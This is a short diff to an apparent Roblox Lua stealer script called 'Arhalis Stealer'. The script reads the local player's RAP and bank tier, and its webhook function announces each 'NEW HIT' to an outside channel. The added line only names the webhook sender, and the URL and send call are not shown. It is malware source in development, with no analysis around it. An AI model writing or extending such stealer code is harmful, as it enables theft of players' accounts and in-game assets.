@@ -25,6 +25,7 @@ _G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
 _G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
 local function sendwebhook(msg)
 local msg = {
+	["username"]= "Arhalis Stealer"
 	["content"]= "**ðŸŽNEW HIT WITH ARKHALISðŸŽ**",
 	["embeds"]= {
 	  {
